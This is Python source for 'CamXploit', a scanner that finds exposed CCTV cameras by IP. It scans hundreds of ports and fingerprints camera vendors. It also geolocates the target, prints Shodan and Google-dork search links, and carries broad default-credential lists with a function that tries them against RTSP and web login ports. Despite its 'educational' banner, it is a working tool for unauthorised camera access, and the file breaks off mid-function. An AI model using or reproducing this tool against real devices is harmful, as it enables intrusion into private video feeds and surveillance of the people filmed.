import requests
import socket
import sys
import threading
import warnings
from xml.etree import ElementTree as ET
import ipaddress
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import time

# Suppress SSL warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request")
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if sys.stdout.isatty():
    R = '\033[31m'  # Red
    G = '\033[32m'  # Green
    C = '\033[36m'  # Cyan
    W = '\033[0m'   # Reset
    Y = '\033[33m'  # Yellow
    M = '\033[35m'  # Magenta
    B = '\033[34m'  # Blue
else:
    R = G = C = W = Y = M = B = ''  # No color in non-TTY environments

BANNER = rf"""
{R}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣸⣏⠛⠻⠿⣿⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣷⣦⣤⣈⠙⠛⠿⣿⣷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⣈⠙⠻⠿⣿⣷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡉⠛⠻⢿⣿⣷⣶⣤⣀⠀⠀
⠀⠀⠀⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⢻⣍⡉⠉⣿⠇⠀
⠀⠀⠀⠀⠀⠀⠀⢹⡏⢹⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣰⣿⣿⣾⠏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⠈⣿⠸⣯⠉⠛⠿⢿⣿⣿⣿⣿⡏⠀⠻⠿⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⡆⢻⡄⣿⡀⠀⠀⠀⠈⠙⠛⠿⠿⠿⠿⠛⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠘⣇⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣀⣿⣴⣿⢾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣴⡶⠾⠟⠛⠋⢹⡏⠀⢹⡇⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣿⠀⠀⠀⠀⢀⣈⣿⣶⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣴⠶⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

  {G}[💀] CamXploit - Camera Exploitation & Exposure Scanner
  {C}[🔍] Discover open CCTV cameras & security flaws
  {Y}[⚠️] For educational & security research purposes only!{W}

  {B}VERSION{W}  = 2.0.2
  {B}Made By{W}  = Spyboy
  {B}Twitter{W}  = https://spyboy.in/twitter
  {B}Discord{W}  = https://spyboy.in/Discord
  {B}Github{W}   = https://github.com/spyboy-productions/CamXploit
"""

# Common ports used by IP cameras and CCTV devices
COMMON_PORTS = [
    # Standard web ports
    80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089,
    8090, 8091, 8092, 8093, 8094, 8095, 8096, 8097, 8098, 8099,
    
    # RTSP ports
    554, 8554, 10554, 1554, 2554, 3554, 4554, 5554, 6554, 7554, 9554,
    
    # RTMP ports
    1935, 1936, 1937, 1938, 1939,
    
    # Custom camera ports
    37777, 37778, 37779, 37780, 37781, 37782, 37783, 37784, 37785, 37786, 37787, 37788, 37789, 37790,
    37791, 37792, 37793, 37794, 37795, 37796, 37797, 37798, 37799, 37800,
    
    # ONVIF ports
    3702, 3703, 3704, 3705, 3706, 3707, 3708, 3709, 3710,
    
    # VLC streaming ports
    8100, 8110, 8120, 8130, 8140, 8150, 8160, 8170, 8180, 8190,
    
    # Common alternative ports
    21, 22, 23, 25, 53, 110, 143, 993, 995,  # FTP, SSH, Telnet, SMTP, DNS, POP3, IMAP, IMAPS, POP3S
    1024, 1025, 1026, 1027, 1028, 1029, 1030,  # Common alternative ports
    2000, 2001, 2002, 2003, 2004, 2005,  # Common alternative ports
    3000, 3001, 3002, 3003, 3004, 3005,  # Common alternative ports
    4000, 4001, 4002, 4003, 4004, 4005,  # Common alternative ports
    5000, 5001, 5002, 5003, 5004, 5005, 5006, 5007, 5008, 5009, 5010,
    6000, 6001, 6002, 6003, 6004, 6005, 6006, 6007, 6008, 6009, 6010,
    7000, 7001, 7002, 7003, 7004, 7005, 7006, 7007, 7008, 7009, 7010,
    9000, 9001, 9002, 9003, 9004, 9005, 9006, 9007, 9008, 9009, 9010,
    
    # Additional common ports
    8888, 8889, 8890, 8891, 8892, 8893, 8894, 8895, 8896, 8897, 8898, 8899,
    9999, 9998, 9997, 9996, 9995, 9994, 9993, 9992, 9991, 9990,
    
    # MMS ports
    1755, 1756, 1757, 1758, 1759, 1760,
    
    # Custom ranges
    10000, 10001, 10002, 10003, 10004, 10005, 10006, 10007, 10008, 10009, 10010,
    11000, 11001, 11002, 11003, 11004, 11005, 11006, 11007, 11008, 11009, 11010,
    12000, 12001, 12002, 12003, 12004, 12005, 12006, 12007, 12008, 12009, 12010,
    13000, 13001, 13002, 13003, 13004, 13005, 13006, 13007, 13008, 13009, 13010,
    14000, 14001, 14002, 14003, 14004, 14005, 14006, 14007, 14008, 14009, 14010,
    15000, 15001, 15002, 15003, 15004, 15005, 15006, 15007, 15008, 15009, 15010,
    
    # High ports commonly used by cameras
    20000, 20001, 20002, 20003, 20004, 20005, 20006, 20007, 20008, 20009, 20010,
    21000, 21001, 21002, 21003, 21004, 21005, 21006, 21007, 21008, 21009, 21010,
    22000, 22001, 22002, 22003, 22004, 22005, 22006, 22007, 22008, 22009, 22010,
    23000, 23001, 23002, 23003, 23004, 23005, 23006, 23007, 23008, 23009, 23010,
    24000, 24001, 24002, 24003, 24004, 24005, 24006, 24007, 24008, 24009, 24010,
    25000, 25001, 25002, 25003, 25004, 25005, 25006, 25007, 25008, 25009, 25010,
    
    # Additional custom ranges
    30000, 30001, 30002, 30003, 30004, 30005, 30006, 30007, 30008, 30009, 30010,
    31000, 31001, 31002, 31003, 31004, 31005, 31006, 31007, 31008, 31009, 31010,
    32000, 32001, 32002, 32003, 32004, 32005, 32006, 32007, 32008, 32009, 32010,
    33000, 33001, 33002, 33003, 33004, 33005, 33006, 33007, 33008, 33009, 33010,
    34000, 34001, 34002, 34003, 34004, 34005, 34006, 34007, 34008, 34009, 34010,
    35000, 35001, 35002, 35003, 35004, 35005, 35006, 35007, 35008, 35009, 35010,
    36000, 36001, 36002, 36003, 36004, 36005, 36006, 36007, 36008, 36009, 36010,
    37000, 37001, 37002, 37003, 37004, 37005, 37006, 37007, 37008, 37009, 37010,
    38000, 38001, 38002, 38003, 38004, 38005, 38006, 38007, 38008, 38009, 38010,
    39000, 39001, 39002, 39003, 39004, 39005, 39006, 39007, 39008, 39009, 39010,
    40000, 40001, 40002, 40003, 40004, 40005, 40006, 40007, 40008, 40009, 40010,
    41000, 41001, 41002, 41003, 41004, 41005, 41006, 41007, 41008, 41009, 41010,
    42000, 42001, 42002, 42003, 42004, 42005, 42006, 42007, 42008, 42009, 42010,
    43000, 43001, 43002, 43003, 43004, 43005, 43006, 43007, 43008, 43009, 43010,
    44000, 44001, 44002, 44003, 44004, 44005, 44006, 44007, 44008, 44009, 44010,
    45000, 45001, 45002, 45003, 45004, 45005, 45006, 45007, 45008, 45009, 45010,
    46000, 46001, 46002, 46003, 46004, 46005, 46006, 46007, 46008, 46009, 46010,
    47000, 47001, 47002, 47003, 47004, 47005, 47006, 47007, 47008, 47009, 47010,
    48000, 48001, 48002, 48003, 48004, 48005, 48006, 48007, 48008, 48009, 48010,
    49000, 49001, 49002, 49003, 49004, 49005, 49006, 49007, 49008, 49009, 49010,
    50000, 50001, 50002, 50003, 50004, 50005, 50006, 50007, 50008, 50009, 50010,
    51000, 51001, 51002, 51003, 51004, 51005, 51006, 51007, 51008, 51009, 51010,
    52000, 52001, 52002, 52003, 52004, 52005, 52006, 52007, 52008, 52009, 52010,
    53000, 53001, 53002, 53003, 53004, 53005, 53006, 53007, 53008, 53009, 53010,
    54000, 54001, 54002, 54003, 54004, 54005, 54006, 54007, 54008, 54009, 54010,
    55000, 55001, 55002, 55003, 55004, 55005, 55006, 55007, 55008, 55009, 55010,
    56000, 56001, 56002, 56003, 56004, 56005, 56006, 56007, 56008, 56009, 56010,
    57000, 57001, 57002, 57003, 57004, 57005, 57006, 57007, 57008, 57009, 57010,
    58000, 58001, 58002, 58003, 58004, 58005, 58006, 58007, 58008, 58009, 58010,
    59000, 59001, 59002, 59003, 59004, 59005, 59006, 59007, 59008, 59009, 59010,
    60000, 60001, 60002, 60003, 60004, 60005, 60006, 60007, 60008, 60009, 60010,
    61000, 61001, 61002, 61003, 61004, 61005, 61006, 61007, 61008, 61009, 61010,
    62000, 62001, 62002, 62003, 62004, 62005, 62006, 62007, 62008, 62009, 62010,
    63000, 63001, 63002, 63003, 63004, 63005, 63006, 63007, 63008, 63009, 63010,
    64000, 64001, 64002, 64003, 64004, 64005, 64006, 64007, 64008, 64009, 64010,
    65000, 65001, 65002, 65003, 65004, 65005, 65006, 65007, 65008, 65009, 65010
]

# Remove duplicates while preserving order
COMMON_PORTS = list(dict.fromkeys(COMMON_PORTS))

# Best‑effort mapping of common CCTV / streaming ports to service names
PORT_SERVICE_MAP = {
    # Web interfaces
    80:  ("HTTP", "Web Interface"),
    81:  ("HTTP-Alt", "Web Interface"),
    82:  ("HTTP-Alt", "Web Interface"),
    83:  ("HTTP-Alt", "Web Interface"),
    84:  ("HTTP-Alt", "Web Interface"),
    85:  ("HTTP-Alt", "Web Interface"),
    86:  ("HTTP-Alt", "Web Interface"),
    87:  ("HTTP-Alt", "Web Interface"),
    88:  ("HTTP-Alt", "Web Interface"),
    89:  ("HTTP-Alt", "Web Interface"),
    443: ("HTTPS", "Secure Web Interface"),
    8080: ("HTTP-Alt", "Web Interface"),
    8443: ("HTTPS-Alt", "Secure Web Interface"),
    8000: ("HTTP-Alt", "Web Interface / Hikvision"),
    8001: ("HTTP-Alt", "Web Interface"),
    8888: ("HTTP-Alt", "Web Interface"),
    9000: ("HTTP-Alt", "Web Interface"),

    # RTSP / RTMP streaming
    554: ("RTSP", "Real-Time Streaming Protocol"),
    8554: ("RTSP-Alt", "Real-Time Streaming Protocol"),
    10554: ("RTSP-Alt", "Real-Time Streaming Protocol"),
    1935: ("RTMP", "Real-Time Messaging Protocol (Streaming)"),

    # ONVIF / discovery
    3702: ("ONVIF", "Device Discovery / Control"),

    # Vendor‑specific / DVR ports
    37777: ("Dahua", "DVR/NVR Service"),
    37778: ("Dahua", "DVR/NVR Service"),
    8008:  ("Hikvision", "Web / API"),

    # MMS / legacy streaming
    1755: ("MMS", "Microsoft Media Server"),
}

# Common admin login pages or interesting paths for cameras
COMMON_PATHS = [
    "/", "/admin", "/login", "/viewer", "/webadmin", "/video", "/stream", "/live", "/snapshot", "/onvif-http/snapshot",
    "/system.ini", "/config", "/setup", "/cgi-bin/", "/api/", "/camera", "/img/main.cgi"
]

# Default credentials commonly used in IP cameras / DVR / NVR
# This is intentionally broad and contains combinations seen across
# Hikvision, Dahua, Axis, CP Plus, Uniview, generic OEM DVRs, etc.
DEFAULT_CREDENTIALS = {
    # Very common admin-style accounts
    "admin": [
        "admin", "1234", "12345", "123456", "1234567", "12345678", "123456789",
        "admin123", "admin1234", "admin12345",
        "password", "pass", "123", "1111", "0000", "8888",
        "default", "admin@123", "Admin123", "Admin1234",
        "888888", "666666",  # Common on many DVRs (Hikvision, Dahua, OEM)
        "4321", "9999"
    ],

    # Root-style accounts (Linux‑based firmwares, some NVRs)
    "root": [
        "root", "toor", "1234", "12345", "123456",
        "pass", "password", "root123", "admin", "1111", "0000"
    ],

    # Generic user accounts
    "user": [
        "user", "user123", "password", "1234", "12345", "123456"
    ],
    "guest": [
        "guest", "guest123", "1234", "12345", "123456"
    ],
    "operator": [
        "operator", "operator123", "1234", "12345"
    ],

    # Additional usernames seen on various CCTV brands / OEM NVRs
    "administrator": [
        "administrator", "admin", "1234", "12345", "123456", "password"
    ],
    "supervisor": [
        "supervisor", "1234", "12345", "123456", "password"
    ],
    "support": [
        "support", "support123", "1234", "password"
    ],
    "system": [
        "system", "system123", "1234", "12345", "123456"
    ],
    "viewer": [
        "viewer", "viewer123", "1234", "12345"
    ],
    "admin1": [
        "admin", "admin1", "1234", "12345", "123456", "password"
    ],
    # Some devices expose numeric "admin"‑like users
    "888888": [
        "888888", "123456", "000000"
    ],
    "666666": [
        "666666", "123456", "000000"
    ],
}

# New constants
HTTPS_PORTS = [443, 8443, 8444]
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
}
TIMEOUT = 5
PORT_SCAN_TIMEOUT = 1.5

# Enhanced CVE database
CVE_DATABASE = {
    "hikvision": [
        "CVE-2021-36260", "CVE-2017-7921", "CVE-2021-31955", "CVE-2021-31956",
        "CVE-2021-31957", "CVE-2021-31958", "CVE-2021-31959", "CVE-2021-31960",
        "CVE-2021-31961", "CVE-2021-31962", "CVE-2021-31963", "CVE-2021-31964"
    ],
    "dahua": [
        "CVE-2021-33044", "CVE-2022-30563", "CVE-2021-33045", "CVE-2021-33046",
        "CVE-2021-33047", "CVE-2021-33048", "CVE-2021-33049", "CVE-2021-33050",
        "CVE-2021-33051", "CVE-2021-33052", "CVE-2021-33053", "CVE-2021-33054"
    ],
    "axis": [
        "CVE-2018-10660", "CVE-2020-29550", "CVE-2020-29551", "CVE-2020-29552",
        "CVE-2020-29553", "CVE-2020-29554", "CVE-2020-29555", "CVE-2020-29556",
        "CVE-2020-29557", "CVE-2020-29558", "CVE-2020-29559", "CVE-2020-29560"
    ],
    "cp plus": [
        # Note: CP Plus CVEs - check for latest vulnerabilities
        # Common issues: default credentials, unpatched firmware
    ]
}

# Thread control
threads_running = True

def print_search_urls(ip):
    print(f"\n[🌍] {C}Use these URLs to check the camera exposure manually:{W}")
    print(f"  🔹 Shodan: https://www.shodan.io/search?query={ip}")
    print(f"  🔹 Censys: https://search.censys.io/hosts/{ip}")
    print(f"  🔹 Zoomeye: https://www.zoomeye.org/searchResult?q={ip}")
    print(f"  🔹 Google Dorking (Quick Search): https://www.google.com/search?q=site:{ip}+inurl:view/view.shtml+OR+inurl:admin.html+OR+inurl:login")

def google_dork_search(ip):
    print(f"\n[🔎] {C}Google Dorking Suggestions:{W}")
    queries = [
        f"site:{ip} inurl:view/view.shtml",
        f"site:{ip} inurl:admin.html",
        f"site:{ip} inurl:login",
        f"intitle:'webcam' inurl:{ip}",
    ]
    for q in queries:
        print(f"  🔍 Google Dork: https://www.google.com/search?q={q.replace(' ', '+')}")

def get_ip_location_info(ip):
    """Get comprehensive IP and location information"""
    print(f"\n{C}[🌍] IP and Location Information:{W}")
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        if response.status_code == 200:
            data = response.json()
            
            # Basic IP Information
            print(f"  🔍 IP: {data.get('ip', 'N/A')}")
            print(f"  🏢 ISP: {data.get('org', 'N/A')}")
            
            # Location Information
            if 'loc' in data:
                lat, lon = data['loc'].split(',')
                print(f"\n  📍 Coordinates:")
                print(f"    Latitude: {lat}")
                print(f"    Longitude: {lon}")
                print(f"    🔗 Google Maps: https://www.google.com/maps?q={lat},{lon}")
                print(f"    🔗 Google Earth: https://earth.google.com/web/@{lat},{lon},0a,1000d,35y,0h,0t,0r")
            
            # Geographic Information
            print(f"\n  🌎 Geographic Details:")
            print(f"    City: {data.get('city', 'N/A')}")
            print(f"    Region: {data.get('region', 'N/A')}")
            print(f"    Country: {data.get('country', 'N/A')}")
            print(f"    Postal Code: {data.get('postal', 'N/A')}")
            
            # Timezone Information
            if 'timezone' in data:
                print(f"\n  ⏰ Timezone: {data['timezone']}")
            
        else:
            print(f"{R}[!] Failed to fetch IP information.{W}")
    except Exception as e:
        print(f"{R}[!] Error getting IP information: {str(e)}{W}")

def parse_ip_port(input_str):
    """Parse IP:PORT format or just IP. Returns (ip, port) where port is None if not provided."""
    input_str = input_str.strip()
    
    # Check if port is provided
    if ':' in input_str:
        parts = input_str.rsplit(':', 1)  # Split from right to handle IPv6
        if len(parts) == 2:
            ip_str, port_str = parts
            try:
                port = int(port_str)
                if 1 <= port <= 65535:
                    return ip_str.strip(), port
                else:
                    print(f"{R}[!] Invalid port number. Must be between 1-65535{W}")
                    return None, None
            except ValueError:
                print(f"{R}[!] Invalid port number: {port_str}{W}")
                return None, None
    
    # No port provided, just IP
    return input_str, None

def validate_ip(target_ip):
    """Validate IP address (with or without port)"""
    try:
        ip = ipaddress.ip_address(target_ip)
        if ip.is_private:
            print(f"{R}[!] Warning: Private IP address detected. This tool is meant for public IPs.{W}")
        return True
    except ValueError:
        print(f"{R}[!] Invalid IP address format{W}")
        return False

def get_protocol(port):
    return "https" if port in HTTPS_PORTS else "http"

def probe_rtsp(ip, port):
    """
    Best‑effort RTSP detection that does NOT rely only on port number.
    Sends a minimal RTSP OPTIONS request and inspects the response.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(PORT_SCAN_TIMEOUT)
            if s.connect_ex((ip, port)) != 0:
                return False

            request = (
                f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\n"
                "CSeq: 1\r\n"
                "\r\n"
            ).encode("ascii", errors="ignore")

            s.sendall(request)
            try:
                data = s.recv(2048)
            except socket.timeout:
                return False

            if not data:
                return False

            text = data.decode(errors="ignore")
            if "RTSP/1.0" not in text:
                return False

            # Look for typical RTSP verbs or Public header
            indicators = ["Public:", "DESCRIBE", "SETUP", "PLAY"]
            return any(ind in text for ind in indicators)
    except Exception:
        return False

def check_ports(ip, additional_ports=None):
    """
    Scan ports on target IP.
    
    Args:
        ip: Target IP address
        additional_ports: Optional list of additional ports to scan (e.g., user-specified ports)
    
    Returns:
        tuple: (open_ports, rtsp_ports)
    """
    # Combine COMMON_PORTS with any additional ports
    ports_to_scan = list(COMMON_PORTS)
    if additional_ports:
        for port in additional_ports:
            if port not in ports_to_scan:
                ports_to_scan.append(port)
    
    print(f"\n[🔍] {C}Scanning comprehensive CCTV ports on IP:{W}", ip)
    print(f"{Y}[⚠️] This will scan {len(ports_to_scan)} ports. This may take a while...{W}")
    open_ports = []
    rtsp_ports = []  # Track RTSP-detected ports
    lock = threading.Lock()
    scanned_count = 0

    def scan_port(port):
        nonlocal scanned_count
        if not threads_running:
            return
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(PORT_SCAN_TIMEOUT)
            try:
                if sock.connect_ex((ip, port)) == 0:
                    with lock:
                        open_ports.append(port)
                        scanned_count += 1  # Count open ports too
                        # Determine protocol (current scan is TCP only)
                        proto = "tcp"

                        # First, actively probe for RTSP on this port
                        is_rtsp = probe_rtsp(ip, port)
                        if is_rtsp:
                            rtsp_ports.append(port)  # Track RTSP port
                            if port == 554:
                                service_name, service_desc = "RTSP", "Real-Time Streaming Protocol"
                            else:
                                service_name, service_desc = "RTSP", "Non-standard port"
                        else:
                            # Look up a friendly service name if known
                            service_name, service_desc = PORT_SERVICE_MAP.get(
                                port, ("Unknown Service", "")
                            )

                        if service_desc:
                            service_str = f"{service_name}  ({service_desc})"
                        else:
                            service_str = service_name

                        print(f"  ✅ [OPEN] {port}/{proto}  {service_str}")

                        # If RTSP was positively detected, also show a suggested stream URL
                        if is_rtsp:
                            print(f"      Stream URL: rtsp://{ip}:{port}/")
                        
                        # Progress indicator
                        if scanned_count % 50 == 0:
                            print(f"  📊 Scanned {scanned_count}/{len(ports_to_scan)} ports...")
                else:
                    with lock:
                        scanned_count += 1
                        if scanned_count % 50 == 0:  # Progress indicator every 50 ports
                            print(f"  📊 Scanned {scanned_count}/{len(ports_to_scan)} ports...")
            except Exception:
                with lock:
                    scanned_count += 1

    # Use more threads for faster scanning
    max_threads = 100  # Increased thread count
    threads = []
    
    for i, port in enumerate(ports_to_scan):
        thread = threading.Thread(target=scan_port, args=(port,))
        thread.daemon = True
        threads.append(thread)
        thread.start()
        
        # Limit concurrent threads to avoid overwhelming the system
        if len(threads) >= max_threads:
            for t in threads:
                t.join()
            threads = []

    # Wait for remaining threads
    for thread in threads:
        thread.join()

    print(f"\n{Y}[📊] Scan completed: {scanned_count} ports checked, {len(open_ports)} ports open{W}")
    return sorted(open_ports), sorted(rtsp_ports)  # Return both open ports and RTSP ports

def check_if_camera(ip, open_ports):
    """Enhanced camera detection with detailed port analysis"""
    print(f"\n{C}[📷] Analyzing Ports for Camera Indicators:{W}")
    camera_indicators = False
    
    # Common camera server headers and keywords
    camera_servers = {
        'hikvision': ['hikvision', 'dvr', 'nvr'],
        'dahua': ['dahua', 'dvr', 'nvr'],
        'axis': ['axis', 'axis communications'],
        'sony': ['sony', 'ipela'],
        'bosch': ['bosch', 'security systems'],
        'samsung': ['samsung', 'samsung techwin'],
        'panasonic': ['panasonic', 'network camera'],
        'vivotek': ['vivotek', 'network camera'],
        'cp plus': ['cp plus', 'cp-plus', 'cpplus', 'cp_plus'],
        'generic': ['camera', 'webcam', 'surveillance', 'ip camera', 'network camera', 'dvr', 'nvr', 'recorder']
    }
    
    # Common camera content types
    camera_content_types = [
        'image/jpeg',
        'image/mjpeg',
        'video/mpeg',
        'video/mp4',
        'video/h264',
        'application/x-mpegURL',
        'video/MP2T',
        'application/octet-stream',
        'text/html',
        'application/json'
    ]
    
    def analyze_port(port):
        nonlocal camera_indicators
        protocol = get_protocol(port)
        base_url = f"{protocol}://{ip}:{port}"
        
        print(f"\n  🔍 Analyzing Port {port} ({protocol.upper()}):")
        
        # Check server headers and response
        try:
            response = requests.get(base_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
            server_header = response.headers.get('Server', '').lower()
            content_type = response.headers.get('Content-Type', '').lower()
            
            # Check server headers for camera brands
            brand_found = False
            for brand, keywords in camera_servers.items():
                if any(keyword in server_header for keyword in keywords):
                    print(f"    ✅ {brand.upper()} Camera Server Detected")
                    brand_found = True
                    camera_indicators = True
                    break
            
            # Check content type
            if any(ct in content_type for ct in camera_content_types):
                print(f"    ✅ Camera Content Type: {content_type}")
                camera_indicators = True
            
            # Check response content for camera indicators
            if response.status_code == 200:
                content = response.text.lower()
                camera_keywords = ['camera', 'webcam', 'surveillance', 'stream', 'video', 'snapshot', 'dvr', 'nvr', 'recorder', 'cctv']
                found_keywords = [kw for kw in camera_keywords if kw in content]
                if found_keywords:
                    print(f"    ✅ Camera Keywords Found: {', '.join(found_keywords)}")
                    camera_indicators = True
                
                # Check for specific CP Plus indicators
                if any(x in content for x in ['cp plus', 'cp-plus', 'cpplus', 'cp_plus', 'uvr', '0401e1']):
                    print(f"    ✅ CP Plus Camera Detected!")
                    camera_indicators = True
            
            # Check common camera endpoints
            endpoints = ['/video', '/stream', '/snapshot', '/cgi-bin', '/admin', '/viewer', '/login', '/index.html', '/']
            for endpoint in endpoints:
                try:
                    endpoint_url = f"{base_url}{endpoint}"
                    endpoint_response = requests.head(endpoint_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
                    if endpoint_response.status_code in [200, 401, 403]:
                        print(f"    ✅ Camera Endpoint Found: {endpoint_url} (HTTP {endpoint_response.status_code})")
                        camera_indicators = True
                except (requests.exceptions.RequestException, Exception):
                    continue
            
            # Print server information
            if server_header:
                print(f"    ℹ️ Server: {server_header}")
            print(f"    ℹ️ Status Code: {response.status_code}")
            
            # Check for authentication
            if response.status_code == 401:
                print(f"    🔐 Authentication Required")
                auth_type = response.headers.get('WWW-Authenticate', '')
                if auth_type:
                    print(f"    🔐 Auth Type: {auth_type}")
            
            # Additional checks for DVR/NVR devices
            if response.status_code == 200:
                # Check for common DVR/NVR page titles
                if '<title>' in content:
                    title_start = content.find('<title>') + 7
                    title_end = content.find('</title>', title_start)
                    if title_end > title_start:
                        title = content[title_start:title_end].lower()
                        if any(x in title for x in ['dvr', 'nvr', 'recorder', 'surveillance', 'cctv', 'camera']):
                            print(f"    ✅ DVR/NVR Page Title: {title}")
                            camera_indicators = True
                
                # Check for common DVR/NVR form fields
                if any(x in content for x in ['username', 'password', 'login', 'admin']):
                    print(f"    ✅ Login Form Detected")
                    camera_indicators = True
                
                # Check for specific CP Plus model indicators
                if any(x in content for x in ['uvr-0401e1', 'uvr0401e1', '0401e1']):
                    print(f"    ✅ CP Plus UVR-0401E1 Model Detected!")
                    camera_indicators = True
            
        except requests.exceptions.RequestException as e:
            print(f"    ❌ Connection Error: {str(e)}")
        except Exception as e:
            print(f"    ❌ Error: {str(e)}")
    
    # Analyze each port
    for port in open_ports:
        analyze_port(port)
    
    return camera_indicators

def check_login_pages(ip, open_ports):
    print(f"\n[🔍] {C}Checking for authentication pages:{W}")
    found_urls = []
    lock = threading.Lock()
    
    def check_endpoint(port, path):
        protocol = get_protocol(port)
        url = f"{protocol}://{ip}:{port}{path}"
        try:
            response = requests.head(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
            if response.status_code in [200, 401, 403]:
                with lock:
                    found_urls.append(url)
                    print(f"  ✅ Found login page: {url} (HTTP {response.status_code})")
                return url
        except (requests.exceptions.RequestException, Exception):
            pass
        return None

    # Use threading for faster checking
    threads = []
    max_concurrent = 50  # Limit concurrent threads
    
    for port in open_ports:
        for path in COMMON_PATHS:
            thread = threading.Thread(target=check_endpoint, args=(port, path))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            
            # Limit concurrent threads to avoid overwhelming
            if len(threads) >= max_concurrent:
                for t in threads:
                    t.join()
                threads = []
    
    # Wait for remaining threads
    for thread in threads:
        thread.join()
    
    if not found_urls:
        print("  ❌ No authentication pages detected")
    else:
        print(f"  📊 Found {len(found_urls)} authentication pages")

def test_rtsp_credentials(ip, port, username, password):
    """Test RTSP credentials using RTSP OPTIONS request with Basic Auth"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            if s.connect_ex((ip, port)) != 0:
                return False
            
            # RTSP OPTIONS request with Basic Auth
            auth_string = base64.b64encode(f"{username}:{password}".encode()).decode()
            request = (
                f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\n"
                f"Authorization: Basic {auth_string}\r\n"
                "CSeq: 1\r\n"
                "\r\n"
            ).encode("ascii", errors="ignore")
            
            s.sendall(request)
            try:
                data = s.recv(2048)
            except socket.timeout:
                return False
            
            if not data:
                return False
            
            text = data.decode(errors="ignore")
            # RTSP 200 OK means authentication succeeded
            if "RTSP/1.0 200" in text or "RTSP/1.0 200 OK" in text:
                return True
            # RTSP 401 Unauthorized means wrong credentials
            if "RTSP/1.0 401" in text:
                return False
    except Exception:
        pass
    return False

def test_default_passwords(ip, open_ports, rtsp_ports=None):
    print(f"\n[🔑] {C}Testing common credentials:{W}")
    found = False
    lock = threading.Lock()
    start_time = time.time()
    MAX_CREDENTIAL_TEST_TIME = 120  # Maximum 2 minutes total for credential testing
    CREDENTIAL_TIMEOUT = 2  # Reduced timeout per request (2 seconds instead of 5)
    
    if rtsp_ports is None:
        rtsp_ports = []
    
    # Prioritized list of most common credentials (test these first)
    # Format: (username, password)
    PRIORITY_CREDENTIALS = [
        ("admin", "admin"),
        ("admin", "1234"),
        ("admin", "12345"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", ""),  # Empty password
        ("admin", "admin123"),
        ("admin", "888888"),
        ("admin", "666666"),
        ("root", "root"),
        ("root", "toor"),
        ("root", "1234"),
        ("admin", "1111"),
        ("admin", "0000"),
        ("admin", "8888"),
        ("user", "user"),
        ("guest", "guest"),
    ]
    
    # Include RTSP ports (MOST IMPORTANT for CCTV!) and web ports
    RTSP_PORTS_LIST = [554, 8554, 10554, 5554, 7070, 8555]  # Common RTSP ports
    WEB_PORTS = [80, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8888, 9000]
    
    # Prioritize RTSP ports - they're the most important for CCTV cameras!
    ports_to_test = []
    
    # First add RTSP ports (detected + standard)
    all_rtsp_ports = set(rtsp_ports) | set([p for p in open_ports if p in RTSP_PORTS_LIST])
    ports_to_test.extend(sorted(all_rtsp_ports))
    
    # Then add web ports
    web_ports = [p for p in open_ports if p in WEB_PORTS or (p < 10000 and p not in all_rtsp_ports)]
    ports_to_test.extend(web_ports[:10])  # Limit web ports to first 10
    
    if not ports_to_test:
        print(f"{Y}[ℹ️] No ports found for credential testing{W}")
        return
    
    rtsp_count = len(all_rtsp_ports)
    web_count = len(web_ports[:10])
    print(f"{Y}[ℹ️] Testing credentials on {rtsp_count} RTSP port(s) + {web_count} web port(s)...{W}")
    if rtsp_count > 0:
